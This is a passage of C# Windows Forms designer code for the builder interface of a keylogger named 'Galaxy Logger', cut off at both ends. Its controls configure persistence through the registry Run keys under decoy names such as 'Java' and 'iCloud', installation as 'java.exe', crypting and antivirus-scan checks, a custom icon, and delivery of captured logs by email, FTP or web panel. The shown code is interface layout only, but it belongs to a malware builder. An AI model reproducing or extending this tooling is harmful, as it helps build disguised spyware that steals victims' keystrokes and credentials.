            this.gbStartup.Controls.Add(this.cbHKCU);
            this.gbStartup.Controls.Add(this.tbHKLM);
            this.gbStartup.Controls.Add(this.tbHKCU);
            this.gbStartup.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.gbStartup.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.gbStartup.Location = new System.Drawing.Point(26, 209);
            this.gbStartup.Name = "gbStartup";
            this.gbStartup.Size = new System.Drawing.Size(446, 112);
            this.gbStartup.TabIndex = 18;
            this.gbStartup.TabStop = false;
            this.gbStartup.Text = "Startup";
            // 
            // cbHKLM
            // 
            this.cbHKLM.BackColor = System.Drawing.Color.Transparent;
            this.cbHKLM.Checked = false;
            this.cbHKLM.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbHKLM.Location = new System.Drawing.Point(10, 72);
            this.cbHKLM.Name = "cbHKLM";
            this.cbHKLM.Size = new System.Drawing.Size(286, 19);
            this.cbHKLM.TabIndex = 15;
            this.cbHKLM.Text = "HKEY_Local_Machine\\Software\\...\\Run";
            // 
            // cbHKCU
            // 
            this.cbHKCU.BackColor = System.Drawing.Color.Transparent;
            this.cbHKCU.Checked = false;
            this.cbHKCU.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbHKCU.Location = new System.Drawing.Point(10, 33);
            this.cbHKCU.Name = "cbHKCU";
            this.cbHKCU.Size = new System.Drawing.Size(277, 19);
            this.cbHKCU.TabIndex = 14;
            this.cbHKCU.Text = "HKEY_Current_User\\Software\\...\\Run";
            // 
            // tbHKLM
            // 
            this.tbHKLM.BackColor = System.Drawing.Color.Transparent;
            this.tbHKLM.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbHKLM.ForeColor = System.Drawing.Color.DimGray;
            this.tbHKLM.Location = new System.Drawing.Point(302, 65);
            this.tbHKLM.MaxLength = 32767;
            this.tbHKLM.Multiline = false;
            this.tbHKLM.Name = "tbHKLM";
            this.tbHKLM.ReadOnly = false;
            this.tbHKLM.Size = new System.Drawing.Size(138, 28);
            this.tbHKLM.TabIndex = 13;
            this.tbHKLM.Text = "iCloud";
            this.tbHKLM.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbHKLM.UseSystemPasswordChar = false;
            // 
            // tbHKCU
            // 
            this.tbHKCU.BackColor = System.Drawing.Color.Transparent;
            this.tbHKCU.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbHKCU.ForeColor = System.Drawing.Color.DimGray;
            this.tbHKCU.Location = new System.Drawing.Point(302, 26);
            this.tbHKCU.MaxLength = 32767;
            this.tbHKCU.Multiline = false;
            this.tbHKCU.Name = "tbHKCU";
            this.tbHKCU.ReadOnly = false;
            this.tbHKCU.Size = new System.Drawing.Size(138, 28);
            this.tbHKCU.TabIndex = 11;
            this.tbHKCU.Text = "Java";
            this.tbHKCU.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbHKCU.UseSystemPasswordChar = false;
            // 
            // gbInstallation
            // 
            this.gbInstallation.Controls.Add(this.tbProcess);
            this.gbInstallation.Controls.Add(this.lblProcess);
            this.gbInstallation.Controls.Add(this.comboBoxDirectory);
            this.gbInstallation.Controls.Add(this.lblSubfolder);
            this.gbInstallation.Controls.Add(this.tbSubfolder);
            this.gbInstallation.Controls.Add(this.lblDirectory);
            this.gbInstallation.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.gbInstallation.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.gbInstallation.Location = new System.Drawing.Point(26, 65);
            this.gbInstallation.Name = "gbInstallation";
            this.gbInstallation.Size = new System.Drawing.Size(446, 138);
            this.gbInstallation.TabIndex = 17;
            this.gbInstallation.TabStop = false;
            this.gbInstallation.Text = "Install File";
            // 
            // tbProcess
            // 
            this.tbProcess.BackColor = System.Drawing.Color.Transparent;
            this.tbProcess.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbProcess.ForeColor = System.Drawing.Color.DimGray;
            this.tbProcess.Location = new System.Drawing.Point(118, 92);
            this.tbProcess.MaxLength = 32767;
            this.tbProcess.Multiline = false;
            this.tbProcess.Name = "tbProcess";
            this.tbProcess.ReadOnly = false;
            this.tbProcess.Size = new System.Drawing.Size(322, 28);
            this.tbProcess.TabIndex = 13;
            this.tbProcess.Text = "java.exe";
            this.tbProcess.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbProcess.UseSystemPasswordChar = false;
            // 
            // lblProcess
            // 
            this.lblProcess.AutoSize = true;
            this.lblProcess.BackColor = System.Drawing.Color.Transparent;
            this.lblProcess.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblProcess.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblProcess.Location = new System.Drawing.Point(47, 96);
            this.lblProcess.Name = "lblProcess";
            this.lblProcess.Size = new System.Drawing.Size(61, 20);
            this.lblProcess.TabIndex = 12;
            this.lblProcess.Text = "Process:";
            // 
            // comboBoxDirectory
            // 
            this.comboBoxDirectory.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(246)))), ((int)(((byte)(246)))), ((int)(((byte)(246)))));
            this.comboBoxDirectory.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboBoxDirectory.DropDownHeight = 100;
            this.comboBoxDirectory.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboBoxDirectory.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.comboBoxDirectory.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(142)))), ((int)(((byte)(142)))));
            this.comboBoxDirectory.FormattingEnabled = true;
            this.comboBoxDirectory.HoverSelectionColor = System.Drawing.Color.Empty;
            this.comboBoxDirectory.IntegralHeight = false;
            this.comboBoxDirectory.ItemHeight = 20;
            this.comboBoxDirectory.Items.AddRange(new object[] {
            "Application Data",
            "Local Application Data",
            "My Documents",
            "Temp"});
            this.comboBoxDirectory.Location = new System.Drawing.Point(118, 26);
            this.comboBoxDirectory.Name = "comboBoxDirectory";
            this.comboBoxDirectory.Size = new System.Drawing.Size(322, 26);
            this.comboBoxDirectory.StartIndex = 0;
            this.comboBoxDirectory.TabIndex = 9;
            // 
            // lblSubfolder
            // 
            this.lblSubfolder.AutoSize = true;
            this.lblSubfolder.BackColor = System.Drawing.Color.Transparent;
            this.lblSubfolder.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblSubfolder.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblSubfolder.Location = new System.Drawing.Point(25, 62);
            this.lblSubfolder.Name = "lblSubfolder";
            this.lblSubfolder.Size = new System.Drawing.Size(83, 20);
            this.lblSubfolder.TabIndex = 10;
            this.lblSubfolder.Text = "Sub-folder:";
            // 
            // tbSubfolder
            // 
            this.tbSubfolder.BackColor = System.Drawing.Color.Transparent;
            this.tbSubfolder.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbSubfolder.ForeColor = System.Drawing.Color.DimGray;
            this.tbSubfolder.Location = new System.Drawing.Point(118, 58);
            this.tbSubfolder.MaxLength = 32767;
            this.tbSubfolder.Multiline = false;
            this.tbSubfolder.Name = "tbSubfolder";
            this.tbSubfolder.ReadOnly = false;
            this.tbSubfolder.Size = new System.Drawing.Size(322, 28);
            this.tbSubfolder.TabIndex = 11;
            this.tbSubfolder.Text = "Java";
            this.tbSubfolder.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbSubfolder.UseSystemPasswordChar = false;
            // 
            // lblDirectory
            // 
            this.lblDirectory.AutoSize = true;
            this.lblDirectory.BackColor = System.Drawing.Color.Transparent;
            this.lblDirectory.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblDirectory.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblDirectory.Location = new System.Drawing.Point(35, 28);
            this.lblDirectory.Name = "lblDirectory";
            this.lblDirectory.Size = new System.Drawing.Size(73, 20);
            this.lblDirectory.TabIndex = 8;
            this.lblDirectory.Text = "Directory:";
            // 
            // cbInstallation
            // 
            this.cbInstallation.Location = new System.Drawing.Point(26, 20);
            this.cbInstallation.Name = "cbInstallation";
            this.cbInstallation.Size = new System.Drawing.Size(79, 27);
            this.cbInstallation.TabIndex = 16;
            this.cbInstallation.Text = "ambiance_Toggle1";
            this.cbInstallation.Toggled = false;
            this.cbInstallation.Type = Ambiance_Toggle._Type.OnOff;
            // 
            // separator2
            // 
            this.separator2.Location = new System.Drawing.Point(26, 49);
            this.separator2.Name = "separator2";
            this.separator2.Size = new System.Drawing.Size(446, 10);
            this.separator2.TabIndex = 15;
            this.separator2.Text = "ambiance_Separator3";
            // 
            // lblInstallation
            // 
            this.lblInstallation.AutoSize = true;
            this.lblInstallation.BackColor = System.Drawing.Color.Transparent;
            this.lblInstallation.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.lblInstallation.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblInstallation.Location = new System.Drawing.Point(113, 23);
            this.lblInstallation.Name = "lblInstallation";
            this.lblInstallation.Size = new System.Drawing.Size(260, 20);
            this.lblInstallation.TabIndex = 14;
            this.lblInstallation.Text = "File Installation (Disable if crypting)";
            // 
            // panelBuild
            // 
            this.panelBuild.Controls.Add(this.pbIcon);
            this.panelBuild.Controls.Add(this.lbBuildLog);
            this.panelBuild.Controls.Add(this.lblBuildLog);
            this.panelBuild.Controls.Add(this.btnBrowseIcon);
            this.panelBuild.Controls.Add(this.tbIconPath);
            this.panelBuild.Controls.Add(this.cbChangeIcon);
            this.panelBuild.Controls.Add(this.separator7);
            this.panelBuild.Controls.Add(this.lblBuild);
            this.panelBuild.Controls.Add(this.btnBuild);
            this.panelBuild.Location = new System.Drawing.Point(245, 42);
            this.panelBuild.Name = "panelBuild";
            this.panelBuild.Size = new System.Drawing.Size(498, 435);
            this.panelBuild.TabIndex = 15;
            this.panelBuild.Visible = false;
            // 
            // pbIcon
            // 
            this.pbIcon.Image = ((System.Drawing.Image)(resources.GetObject("pbIcon.Image")));
            this.pbIcon.Location = new System.Drawing.Point(368, 51);
            this.pbIcon.Name = "pbIcon";
            this.pbIcon.Size = new System.Drawing.Size(64, 64);
            this.pbIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pbIcon.TabIndex = 7;
            this.pbIcon.TabStop = false;
            // 
            // lbBuildLog
            // 
            this.lbBuildLog.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.lbBuildLog.Font = new System.Drawing.Font("Microsoft Sans Serif", 11F);
            this.lbBuildLog.FormattingEnabled = true;
            this.lbBuildLog.IntegralHeight = false;
            this.lbBuildLog.ItemHeight = 18;
            this.lbBuildLog.Location = new System.Drawing.Point(19, 155);
            this.lbBuildLog.Name = "lbBuildLog";
            this.lbBuildLog.Size = new System.Drawing.Size(446, 223);
            this.lbBuildLog.TabIndex = 18;
            // 
            // lblBuildLog
            // 
            this.lblBuildLog.AutoSize = true;
            this.lblBuildLog.BackColor = System.Drawing.Color.Transparent;
            this.lblBuildLog.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblBuildLog.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblBuildLog.Location = new System.Drawing.Point(159, 130);
            this.lblBuildLog.Name = "lblBuildLog";
            this.lblBuildLog.Size = new System.Drawing.Size(147, 20);
            this.lblBuildLog.TabIndex = 17;
            this.lblBuildLog.Text = "[- Server Build Log -]";
            // 
            // btnBrowseIcon
            // 
            this.btnBrowseIcon.BackColor = System.Drawing.Color.Transparent;
            this.btnBrowseIcon.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.btnBrowseIcon.Image = null;
            this.btnBrowseIcon.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.btnBrowseIcon.Location = new System.Drawing.Point(163, 51);
            this.btnBrowseIcon.Name = "btnBrowseIcon";
            this.btnBrowseIcon.Size = new System.Drawing.Size(177, 30);
            this.btnBrowseIcon.TabIndex = 16;
            this.btnBrowseIcon.Text = "Browse";
            this.btnBrowseIcon.TextAlignment = System.Drawing.StringAlignment.Center;
            this.btnBrowseIcon.Click += new System.EventHandler(this.btnBrowseIcon_Click);
            // 
            // tbIconPath
            // 
            this.tbIconPath.BackColor = System.Drawing.Color.Transparent;
            this.tbIconPath.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbIconPath.ForeColor = System.Drawing.Color.DimGray;
            this.tbIconPath.Location = new System.Drawing.Point(19, 87);
            this.tbIconPath.MaxLength = 32767;
            this.tbIconPath.Multiline = false;
            this.tbIconPath.Name = "tbIconPath";
            this.tbIconPath.ReadOnly = false;
            this.tbIconPath.Size = new System.Drawing.Size(321, 28);
            this.tbIconPath.TabIndex = 15;
            this.tbIconPath.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbIconPath.UseSystemPasswordChar = false;
            // 
            // cbChangeIcon
            // 
            this.cbChangeIcon.BackColor = System.Drawing.Color.Transparent;
            this.cbChangeIcon.Checked = false;
            this.cbChangeIcon.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbChangeIcon.Location = new System.Drawing.Point(19, 59);
            this.cbChangeIcon.Name = "cbChangeIcon";
            this.cbChangeIcon.Size = new System.Drawing.Size(111, 19);
            this.cbChangeIcon.TabIndex = 14;
            this.cbChangeIcon.Text = "Change Icon";
            // 
            // separator7
            // 
            this.separator7.Location = new System.Drawing.Point(19, 36);
            this.separator7.Name = "separator7";
            this.separator7.Size = new System.Drawing.Size(446, 10);
            this.separator7.TabIndex = 13;
            this.separator7.Text = "ambiance_Separator6";
            // 
            // lblBuild
            // 
            this.lblBuild.AutoSize = true;
            this.lblBuild.BackColor = System.Drawing.Color.Transparent;
            this.lblBuild.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.lblBuild.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblBuild.Location = new System.Drawing.Point(24, 15);
            this.lblBuild.Name = "lblBuild";
            this.lblBuild.Size = new System.Drawing.Size(149, 20);
            this.lblBuild.TabIndex = 12;
            this.lblBuild.Text = "Build Galaxy Logger";
            // 
            // btnBuild
            // 
            this.btnBuild.BackColor = System.Drawing.Color.Transparent;
            this.btnBuild.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.btnBuild.Image = null;
            this.btnBuild.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.btnBuild.Location = new System.Drawing.Point(19, 384);
            this.btnBuild.Name = "btnBuild";
            this.btnBuild.Size = new System.Drawing.Size(446, 30);
            this.btnBuild.TabIndex = 11;
            this.btnBuild.Text = "Build Galaxy Logger Binary";
            this.btnBuild.TextAlignment = System.Drawing.StringAlignment.Center;
            this.btnBuild.Click += new System.EventHandler(this.btnBuild_Click);
            // 
            // panelAVScanner
            // 
            this.panelAVScanner.Controls.Add(this.lvwScanner);
            this.panelAVScanner.Controls.Add(this.scanStatusLabel);
            this.panelAVScanner.Controls.Add(this.avScanButton);
            this.panelAVScanner.Controls.Add(this.scanbbcodeTextBox);
            this.panelAVScanner.Controls.Add(this.scanLinkTextBox);
            this.panelAVScanner.Controls.Add(this.scanRateTextBox);
            this.panelAVScanner.Controls.Add(this.bbCodeLabel);
            this.panelAVScanner.Controls.Add(this.linkLabel);
            this.panelAVScanner.Controls.Add(this.rateLabel);
            this.panelAVScanner.Controls.Add(this.scanBrowseTextbox);
            this.panelAVScanner.Controls.Add(this.scanBrowseButton);
            this.panelAVScanner.Location = new System.Drawing.Point(241, 40);
            this.panelAVScanner.Name = "panelAVScanner";
            this.panelAVScanner.Size = new System.Drawing.Size(502, 443);
            this.panelAVScanner.TabIndex = 31;
            // 
            // lvwScanner
            // 
            this.lvwScanner.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.lvwScanner.Location = new System.Drawing.Point(24, 59);
            this.lvwScanner.Name = "lvwScanner";
            this.lvwScanner.Size = new System.Drawing.Size(472, 233);
            this.lvwScanner.TabIndex = 11;
            this.lvwScanner.UseCompatibleStateImageBehavior = false;
            // 
            // scanStatusLabel
            // 
            this.scanStatusLabel.AutoSize = true;
            this.scanStatusLabel.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(152)))), ((int)(((byte)(156)))));
            this.scanStatusLabel.Location = new System.Drawing.Point(12, 423);
            this.scanStatusLabel.Name = "scanStatusLabel";
            this.scanStatusLabel.Size = new System.Drawing.Size(52, 13);
            this.scanStatusLabel.TabIndex = 9;
            this.scanStatusLabel.Text = "Status: ";
            // 
            // avScanButton
            // 
            this.avScanButton.Location = new System.Drawing.Point(421, 411);
            this.avScanButton.Name = "avScanButton";
            this.avScanButton.Size = new System.Drawing.Size(75, 23);
            this.avScanButton.TabIndex = 8;
            this.avScanButton.Text = "Scan";
            this.avScanButton.Click += new System.EventHandler(this.avScanButton_Click);
            // 
            // scanbbcodeTextBox
            // 
            this.scanbbcodeTextBox.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.scanbbcodeTextBox.Location = new System.Drawing.Point(71, 354);
            this.scanbbcodeTextBox.MaxLength = 32767;
            this.scanbbcodeTextBox.Multiline = false;
            this.scanbbcodeTextBox.Name = "scanbbcodeTextBox";
            this.scanbbcodeTextBox.ReadOnly = false;
            this.scanbbcodeTextBox.Size = new System.Drawing.Size(261, 57);
            this.scanbbcodeTextBox.TabIndex = 7;
            this.scanbbcodeTextBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.scanbbcodeTextBox.UseSystemPasswordChar = false;
            // 
            // scanLinkTextBox
            // 
            this.scanLinkTextBox.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.scanLinkTextBox.Location = new System.Drawing.Point(71, 327);
            this.scanLinkTextBox.MaxLength = 32767;
            this.scanLinkTextBox.Multiline = false;
            this.scanLinkTextBox.Name = "scanLinkTextBox";
            this.scanLinkTextBox.ReadOnly = false;
            this.scanLinkTextBox.Size = new System.Drawing.Size(261, 21);
            this.scanLinkTextBox.TabIndex = 6;
            this.scanLinkTextBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.scanLinkTextBox.UseSystemPasswordChar = false;
            // 
            // scanRateTextBox
            // 
            this.scanRateTextBox.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.scanRateTextBox.Location = new System.Drawing.Point(71, 298);
            this.scanRateTextBox.MaxLength = 32767;
            this.scanRateTextBox.Multiline = false;
            this.scanRateTextBox.Name = "scanRateTextBox";
            this.scanRateTextBox.ReadOnly = false;
            this.scanRateTextBox.Size = new System.Drawing.Size(261, 21);
            this.scanRateTextBox.TabIndex = 5;
            this.scanRateTextBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.scanRateTextBox.UseSystemPasswordChar = false;
            // 
            // bbCodeLabel
            // 
            this.bbCodeLabel.AutoSize = true;
            this.bbCodeLabel.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(152)))), ((int)(((byte)(156)))));
            this.bbCodeLabel.Location = new System.Drawing.Point(7, 359);
            this.bbCodeLabel.Name = "bbCodeLabel";
            this.bbCodeLabel.Size = new System.Drawing.Size(58, 13);
            this.bbCodeLabel.TabIndex = 4;
            this.bbCodeLabel.Text = "BBCode:";
            this.bbCodeLabel.Click += new System.EventHandler(this.bbCodeLabel_Click);
            // 
            // linkLabel
            // 
            this.linkLabel.AutoSize = true;
            this.linkLabel.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(152)))), ((int)(((byte)(156)))));
            this.linkLabel.Location = new System.Drawing.Point(29, 329);
            this.linkLabel.Name = "linkLabel";
            this.linkLabel.Size = new System.Drawing.Size(39, 13);
            this.linkLabel.TabIndex = 3;
            this.linkLabel.Text = "Link: ";
            // 
            // rateLabel
            // 
            this.rateLabel.AutoSize = true;
            this.rateLabel.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(152)))), ((int)(((byte)(156)))));
            this.rateLabel.Location = new System.Drawing.Point(27, 299);
            this.rateLabel.Name = "rateLabel";
            this.rateLabel.Size = new System.Drawing.Size(42, 13);
            this.rateLabel.TabIndex = 2;
            this.rateLabel.Text = "Rate: ";
            // 
            // scanBrowseTextbox
            // 
            this.scanBrowseTextbox.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.scanBrowseTextbox.Location = new System.Drawing.Point(104, 26);
            this.scanBrowseTextbox.MaxLength = 32767;
            this.scanBrowseTextbox.Multiline = false;
            this.scanBrowseTextbox.Name = "scanBrowseTextbox";
            this.scanBrowseTextbox.ReadOnly = false;
            this.scanBrowseTextbox.Size = new System.Drawing.Size(261, 21);
            this.scanBrowseTextbox.TabIndex = 1;
            this.scanBrowseTextbox.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.scanBrowseTextbox.UseSystemPasswordChar = false;
            // 
            // scanBrowseButton
            // 
            this.scanBrowseButton.Location = new System.Drawing.Point(23, 26);
            this.scanBrowseButton.Name = "scanBrowseButton";
            this.scanBrowseButton.Size = new System.Drawing.Size(75, 23);
            this.scanBrowseButton.TabIndex = 0;
            this.scanBrowseButton.Text = "Browse";
            this.scanBrowseButton.Click += new System.EventHandler(this.scanBrowseButton_Click);
            // 
            // panelNews
            // 
            this.panelNews.Controls.Add(this.newsLabel);
            this.panelNews.Controls.Add(this.NewsText);
            this.panelNews.Location = new System.Drawing.Point(236, 42);
            this.panelNews.Name = "panelNews";
            this.panelNews.Size = new System.Drawing.Size(498, 435);
            this.panelNews.TabIndex = 22;
            this.panelNews.Visible = false;
            // 
            // newsLabel
            // 
            this.newsLabel.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold);
            this.newsLabel.Location = new System.Drawing.Point(23, 23);
            this.newsLabel.Name = "newsLabel";
            this.newsLabel.Size = new System.Drawing.Size(75, 23);
            this.newsLabel.TabIndex = 1;
            this.newsLabel.Text = "nsLabel1";
            this.newsLabel.Value1 = "News:";
            this.newsLabel.Value2 = "";
            // 
            // NewsText
            // 
            this.NewsText.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.NewsText.Location = new System.Drawing.Point(23, 56);
            this.NewsText.MaxLength = 32767;
            this.NewsText.Multiline = true;
            this.NewsText.Name = "NewsText";
            this.NewsText.ReadOnly = false;
            this.NewsText.Size = new System.Drawing.Size(460, 373);
            this.NewsText.TabIndex = 0;
            this.NewsText.Text = "Cannot Connect To Server";
            this.NewsText.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.NewsText.UseSystemPasswordChar = false;
            // 
            // panelDelivery
            // 
            this.panelDelivery.Controls.Add(this.btnTestDelivery);
            this.panelDelivery.Controls.Add(this.nudLogInterval);
            this.panelDelivery.Controls.Add(this.lblLogInterval);
            this.panelDelivery.Controls.Add(this.gbWebPanel);
            this.panelDelivery.Controls.Add(this.gbFTP);
            this.panelDelivery.Controls.Add(this.rbPanel);
            this.panelDelivery.Controls.Add(this.rbFTP);
            this.panelDelivery.Controls.Add(this.rbEmail);
            this.panelDelivery.Controls.Add(this.gbEmail);
            this.panelDelivery.Controls.Add(this.separator1);
            this.panelDelivery.Controls.Add(this.lblDeliveryMethod);
            this.panelDelivery.Location = new System.Drawing.Point(245, 42);
            this.panelDelivery.Name = "panelDelivery";
            this.panelDelivery.Size = new System.Drawing.Size(498, 435);
            this.panelDelivery.TabIndex = 9;
            this.panelDelivery.Visible = false;
            // 
            // btnTestDelivery
            // 
            this.btnTestDelivery.BackColor = System.Drawing.Color.Transparent;
            this.btnTestDelivery.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.btnTestDelivery.Image = null;
            this.btnTestDelivery.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.btnTestDelivery.Location = new System.Drawing.Point(28, 84);
            this.btnTestDelivery.Name = "btnTestDelivery";
            this.btnTestDelivery.Size = new System.Drawing.Size(211, 30);
            this.btnTestDelivery.TabIndex = 21;
            this.btnTestDelivery.Text = "Test Delivery";
            this.btnTestDelivery.TextAlignment = System.Drawing.StringAlignment.Center;
            this.btnTestDelivery.Click += new System.EventHandler(this.btnTestDelivery_Click);
            // 
            // nudLogInterval
            // 
            this.nudLogInterval.BackColor = System.Drawing.Color.Transparent;
            this.nudLogInterval.Font = new System.Drawing.Font("Tahoma", 11F);
            this.nudLogInterval.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(76)))));
            this.nudLogInterval.Location = new System.Drawing.Point(337, 85);
            this.nudLogInterval.Maximum = ((long)(100));
            this.nudLogInterval.Minimum = ((long)(0));
            this.nudLogInterval.MinimumSize = new System.Drawing.Size(93, 28);
            this.nudLogInterval.Name = "nudLogInterval";
            this.nudLogInterval.Size = new System.Drawing.Size(137, 28);
            this.nudLogInterval.TabIndex = 20;
            this.nudLogInterval.Text = "ambiance_NumericUpDown1";
            this.nudLogInterval.TextAlignment = Ambiance_NumericUpDown._TextAlignment.Near;
            this.nudLogInterval.Value = ((long)(30));
            // 
            // lblLogInterval
            // 
            this.lblLogInterval.AutoSize = true;
            this.lblLogInterval.BackColor = System.Drawing.Color.Transparent;
            this.lblLogInterval.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblLogInterval.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblLogInterval.Location = new System.Drawing.Point(241, 88);
            this.lblLogInterval.Name = "lblLogInterval";
            this.lblLogInterval.Size = new System.Drawing.Size(90, 20);
            this.lblLogInterval.TabIndex = 19;
            this.lblLogInterval.Text = "Log Interval:";
            // 
            // gbWebPanel
            // 
            this.gbWebPanel.Controls.Add(this.tbWebPanelUploadKey);
            this.gbWebPanel.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.gbWebPanel.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.gbWebPanel.Location = new System.Drawing.Point(28, 123);
            this.gbWebPanel.Name = "gbWebPanel";
            this.gbWebPanel.Size = new System.Drawing.Size(446, 73);
            this.gbWebPanel.TabIndex = 18;
            this.gbWebPanel.TabStop = false;
            this.gbWebPanel.Text = "Web Panel";
            // 
            // tbWebPanelUploadKey
            // 
            this.tbWebPanelUploadKey.BackColor = System.Drawing.Color.Transparent;
            this.tbWebPanelUploadKey.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbWebPanelUploadKey.ForeColor = System.Drawing.Color.DimGray;
            this.tbWebPanelUploadKey.Location = new System.Drawing.Point(19, 26);
            this.tbWebPanelUploadKey.MaxLength = 32767;
            this.tbWebPanelUploadKey.Multiline = false;
            this.tbWebPanelUploadKey.Name = "tbWebPanelUploadKey";
            this.tbWebPanelUploadKey.ReadOnly = false;
            this.tbWebPanelUploadKey.Size = new System.Drawing.Size(403, 28);
            this.tbWebPanelUploadKey.TabIndex = 1;
            this.tbWebPanelUploadKey.Text = "Web Panel Upload Key";
            this.tbWebPanelUploadKey.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbWebPanelUploadKey.UseSystemPasswordChar = false;
            // 
            // gbFTP
            // 
            this.gbFTP.Controls.Add(this.tbFTPPassword);
            this.gbFTP.Controls.Add(this.tbFTPUsername);
            this.gbFTP.Controls.Add(this.tbFTPServer);
            this.gbFTP.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.gbFTP.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.gbFTP.Location = new System.Drawing.Point(28, 313);
            this.gbFTP.Name = "gbFTP";
            this.gbFTP.Size = new System.Drawing.Size(446, 105);
            this.gbFTP.TabIndex = 17;
            this.gbFTP.TabStop = false;
            this.gbFTP.Text = "FTP";
            // 
            // tbFTPPassword
            // 
            this.tbFTPPassword.BackColor = System.Drawing.Color.Transparent;
            this.tbFTPPassword.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbFTPPassword.ForeColor = System.Drawing.Color.DimGray;
            this.tbFTPPassword.Location = new System.Drawing.Point(217, 26);
            this.tbFTPPassword.MaxLength = 32767;
            this.tbFTPPassword.Multiline = false;
            this.tbFTPPassword.Name = "tbFTPPassword";
            this.tbFTPPassword.ReadOnly = false;
            this.tbFTPPassword.Size = new System.Drawing.Size(205, 28);
            this.tbFTPPassword.TabIndex = 3;
            this.tbFTPPassword.Text = "password";
            this.tbFTPPassword.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbFTPPassword.UseSystemPasswordChar = true;
            // 
            // tbFTPUsername
            // 
